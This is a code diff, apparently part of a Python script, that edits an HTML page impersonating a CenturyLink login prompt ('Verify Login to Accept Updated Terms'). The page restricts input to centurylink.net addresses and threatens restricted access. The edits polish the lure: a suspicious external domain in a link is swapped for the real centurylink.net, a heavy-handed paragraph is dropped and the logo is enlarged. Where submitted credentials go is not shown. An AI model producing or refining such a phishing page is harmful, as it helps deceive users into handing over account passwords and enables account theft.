@@ -1,3 +1,4 @@
+html_page = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -40,7 +41,7 @@
     }
 
     .logo img {
-      max-width: 100px;
+      max-width: 160px;
       height: auto;
       display: inline-block;
     }
@@ -150,12 +151,8 @@
 
       <h1>Verify Login to Accept Updated Terms</h1>
 
-      <p>
-        To continue using your account, you are <span class="highlight">required to verify your login</span> and accept our updated Service Terms Agreement.
-      </p>
-
       <div class="notice-box">
-        Log in below to review and accept the new terms. Access to your account may be restricted until this step is completed.
+        Log in below to verify and accept the new terms. Access to your account may be restricted until this step is completed.
       </div>
 
       <div class="form-wrapper">
@@ -179,7 +176,7 @@
         After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
         <br>
         You can also view the terms any time at
-        <a href="https://www.viewactivityreport.net/service-terms" class="link-terms">this page</a>.
+        <a href="https://www.centurylink.net/service-terms" class="link-terms">this page</a>.
       </p>
     </div>
   </div>
@@ -205,7 +202,7 @@
       passwordError.textContent = "";
 
       const emailValue = emailInput.value.trim();
-      const allowedDomainRegex = /^[^@\s]+@(centurylink\.net)$/i;
+      const allowedDomainRegex = /^[^@\\s]+@(centurylink\\.net)$/i;
 
       if (!emailValue) {
         emailError.textContent = "Email is required.";
@@ -247,3 +244,4 @@
   </script>
 </body>
 </html>
+"""
